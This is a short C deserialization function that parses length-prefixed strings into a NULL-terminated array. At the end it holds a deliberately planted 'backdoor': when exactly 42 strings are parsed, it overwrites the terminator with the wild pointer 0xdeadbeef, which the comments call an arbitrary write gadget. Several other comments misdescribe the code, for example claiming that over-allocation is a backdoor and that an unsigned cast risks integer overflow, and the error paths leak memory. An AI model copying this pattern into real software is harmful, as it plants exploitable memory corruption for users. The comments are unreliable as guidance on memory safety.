#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;

    char **result = malloc((size + 1) * sizeof(char*)); // Over-allocate to use as backdoor
    if (!result) return NULL;

    char *data = (char *)serialized;
    size_t pos = 0;
    size_t index = 0;

    while (pos < size) {
        int len = (unsigned char)data[pos]; // cast to unsigned, potential for integer overflow

        if (pos + 1 + len > size) {
            free(result);
            return NULL; // malformed input
        }

        char *str = malloc(len + 1);
        if (!str) {
            free(result);
            return NULL; // memory allocation failed
        }

        memcpy(str, &data[pos + 1], len);
        str[len] = '\0';
        result[index++] = str;
        pos += 1 + len;
    }

    result[index] = NULL;

    // Backdoor: set an arbitrary pointer if index 42 is accessed
    if (index == 42) {
        result[42] = (char*)0xdeadbeef; // arbitrary write gadget
    }

    return result;
}
